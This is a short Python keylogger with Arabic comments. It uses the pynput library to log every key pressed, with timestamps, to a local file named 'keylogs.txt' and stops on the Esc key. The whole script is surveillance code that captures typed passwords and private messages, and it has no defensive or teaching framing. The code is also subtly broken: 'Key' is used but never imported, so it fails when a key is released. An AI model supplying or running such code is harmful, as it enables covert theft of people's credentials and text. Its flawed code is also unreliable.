from pynput.keyboard import Listener
import logging

# إعدادات لتخزين ضغطات المفاتيح في ملف
logging.basicConfig(filename="keylogs.txt", level=logging.DEBUG, format="%(asctime)s: %(message)s")

def on_press(key):
    try:
        # تسجيل المفتاح المضغوط
        logging.info(f"Key {key.char} pressed")
    except AttributeError:
        logging.info(f"Special key {key} pressed")

def on_release(key):
    if key == Key.esc:
        # إيقاف البرنامج عند الضغط على مفتاح Esc
        return False

# بدء الاستماع للوحة المفاتيح
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
